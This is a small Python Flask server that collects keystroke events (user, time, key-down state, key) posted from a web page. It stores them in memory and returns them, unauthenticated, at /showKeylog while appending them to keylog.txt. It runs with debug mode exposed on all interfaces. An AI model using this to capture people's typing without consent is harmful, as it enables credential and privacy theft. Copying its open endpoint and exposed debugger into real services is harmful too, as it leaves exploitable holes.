from flask import Flask, render_template, request, make_response, jsonify
import json
from json import JSONEncoder

keylog = []

class Key:
  def __init__(self, user, time, key_down, key):
    self.user = user
    self.time = time
    self.key_down = key_down
    self.key = key

  def toJSON(self):
    return json.dumps(self, default=lambda o: o.__dict__, sort_keys=True, indent=4)

#start flask app
app = Flask(__name__)

@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/js_keylog', methods=['POST'])
def addLog():
  data = request.get_json()

  for key in range(len(data)):
    print(data[key])
    user = data[key]['user']
    time = data[key]['time']
    key_down = data[key]['key-down']
    key_pressed = data[key]['key']

    k = Key(user,time,key_down,key_pressed)
    keylog.append(k)

  return make_response(jsonify({'response': 'Success', 'code':200}), 200)

@app.route('/js_keylog', methods=['GET'])
def keylogPage():
  return render_template('js_keylog.html')

@app.route('/showKeylog', methods=['GET'])
def showKeylog():
  res = {}
  
  for k in range(len(keylog)):
    res[k] = keylog[k].toJSON()
    print(res[k])
    with open("keylog.txt","a") as f:
      f.write(res[k])
      f.write("\n")
  return res

if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int("6060"), debug=True)
  #app.run(debug=True)
